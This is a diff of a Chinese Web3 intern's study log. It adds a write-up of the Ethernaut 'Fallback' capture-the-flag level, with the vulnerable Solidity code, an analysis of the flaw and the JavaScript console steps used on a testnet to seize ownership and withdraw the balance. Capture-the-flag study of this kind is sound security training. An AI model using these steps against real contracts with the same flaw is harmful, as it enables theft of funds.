@@ -15,8 +15,170 @@ Web3 实习计划 2025 冬季实习生
 ## Notes
 
 <!-- Content_START -->
+# 2026-01-24
+<!-- DAILY_CHECKIN_2026-01-24_START -->
+\# Web3 学习笔记 · 第十二天
+
+\## 🧠 今日学习内容
+
+**Ethernaut 第一关：Fallback**
+
+\---
+
+\## 🛡️ Ethernaut 是什么？
+
+\- **开源智能合约安全挑战平台**（OpenZeppelin 出品）
+
+\- 每关是一个有漏洞的合约，目标是找到并利用它
+
+\- 形式：CTF（Capture The Flag）风格，通关即学习
+
+\---
+
+\## 🧩 第一关：Fallback（回退函数漏洞）
+
+\### 一、关卡目标
+
+\- 成为合约的 `owner`
+
+\- 将合约余额降为 0
+
+\### 二、合约漏洞分析
+
+\#### 1. 关键代码逻辑：
+
+\`\`\`solidity
+
+function contribute() public payable {
+
+require(msg.value < 0.001 ether);
+
+contributions\[msg.sender\] += msg.value;
+
+if(contributions\[msg.sender\] > contributions\[owner\]) {
+
+owner = msg.sender;
+
+}
+
+}
+
+receive() external payable {
+
+require(msg.value > 0 && contributions\[msg.sender\] > 0);
+
+owner = msg.sender;
+
+}
+
+\`\`\`
+
+\#### 2. 漏洞点：
+
+\- \*`receive` 函数\*\*（回退函数）中修改 `owner` 的条件过于宽松：
+
+1\. `msg.value > 0`（任意大于0的ETH）
+
+2\. `contributions[msg.sender] > 0`（曾经贡献过任意金额）
+
+\- 只要满足这两点，转账即可成为 `owner`
+
+\#### 3. 攻击路径：
+
+1\. 先调用 `contribute()` 发送极小 ETH（如 1 wei）→ 满足条件2
+
+2\. 直接向合约转账任意 ETH（>0）→ 触发 `receive()`，成为 `owner`
+
+3\. 调用 `withdraw()` 提走所有余额
+
+\---
+
+\## 🔧 我的通关步骤（在测试网执行）
+
+\### 步骤一：分析合约
+
+\- 在 Remix 或 Etherscan 上查看合约代码
+
+\- 理解 `owner` 修改的两种路径
+
+\### 步骤二：实施攻击
+
+1\. **连接合约**（通过网页控制台或 Remix）
+
+2\. **调用 contribute**：
+
+\`\`\`javascript
+
+await contract.contribute({ value: toWei('0.0001') })
+
+\`\`\`
+
+3\. **直接转账触发 receive**：
+
+\`\`\`javascript
+
+await sendTransaction({ to: contract.address, value: toWei('0.0001') })
+
+\`\`\`
+
+4\. **验证成为 owner**：
+
+\`\`\`javascript
+
+await contract.owner() === player
+
+\`\`\`
+
+5\. **提款**：
+
+\`\`\`javascript
+
+await contract.withdraw()
+
+\`\`\`
+
+\### 步骤三：提交
+
+\- 在网页点击提交（Submit）
+
+\- 确认关卡状态变为已完成
+
+\---
+
+\## 💡 学到的安全教训
+
+1\. **回退函数（receive/fallback）是高风险区域**
+
+\- 应避免在其中修改关键状态（如 `owner`）
+
+\- 应对调用者进行严格权限检查
+
+2\. **条件检查必须严谨**
+
+\- 本关中 `contributions[msg.sender] > 0` 过于宽松
+
+\- 应改为明确的门槛或权重要求
+
+3\. **最小权限原则**
+
+\- 即使是通过“贡献”成为 owner，也应设置合理阈值
+
+\- 避免通过非主逻辑路径（如回退函数）进行权限变更
+
+\---
+
+\## 🧭 明日计划
+
+1\. 继续完成 Ethernaut 第二、三关
+
+2\. 每关写一份简要漏洞分析与攻击步骤
+
+3\. 尝试在本地 Hardhat 环境中复现攻击
+<!-- DAILY_CHECKIN_2026-01-24_END -->
+
 # 2026-01-23
 <!-- DAILY_CHECKIN_2026-01-23_START -->
+
 \# Web3 学习笔记 · 第十一天
 
 \## 🧠 今日学习内容
@@ -178,6 +340,7 @@ yarn start
 
 # 2026-01-22
 <!-- DAILY_CHECKIN_2026-01-22_START -->
+
 
 \# Web3 学习笔记 · 第十天
 
@@ -342,6 +505,7 @@ mapping(address => User) public users;
 <!-- DAILY_CHECKIN_2026-01-21_START -->
 
 
+
 \# Web3 学习笔记 · 第九天
 
 \## 🧠 今日主题：NFT 铸造 + zkVote 初体验 + Uniswap 入门
@@ -496,6 +660,7 @@ mapping(address => User) public users;
 
 
 
+
 \# Web3 学习笔记 · 补充（实习计划概览与任务进展）
 
 \## 📋 实习计划结构与进展概览
@@ -635,6 +800,7 @@ hasClaimed\[leaf\] = true;
 
 
 
+
 \# Web3 学习笔记 · 第八天
 
 \## 🧠 今日学习主题：智能合约初体验 + 密钥哈希 Token 理解
@@ -761,6 +927,7 @@ hasClaimed\[leaf\] = true;
 
 
 
+
 ## **🛡️ 今日学习主题：Web3 安全入门与实践**
 
 （基于 Unphishable 平台引导内容）
@@ -876,6 +1043,7 @@ hasClaimed\[leaf\] = true;
 
 # 2026-01-17
 <!-- DAILY_CHECKIN_2026-01-17_START -->
+
 
 
 
@@ -1037,6 +1205,7 @@ hasClaimed\[leaf\] = true;
 
 # 2026-01-16
 <!-- DAILY_CHECKIN_2026-01-16_START -->
+
 
 
 
@@ -1229,6 +1398,7 @@ hasClaimed\[leaf\] = true;
 
 
 
+
 # **Web3 学习笔记 · 第四天**
 
 ## **📖 今日学习材料**
@@ -1257,6 +1427,7 @@ hasClaimed\[leaf\] = true;
 
 # 2026-01-14
 <!-- DAILY_CHECKIN_2026-01-14_START -->
+
 
 
 
@@ -1391,6 +1562,7 @@ hasClaimed\[leaf\] = true;
 
 
 
+
 \# Web3 实习手册学习笔记
 
 \## 📘 入门导读
@@ -1434,6 +1606,7 @@ hasClaimed\[leaf\] = true;
 
 # 2026-01-12
 <!-- DAILY_CHECKIN_2026-01-12_START -->
+
 
 
 
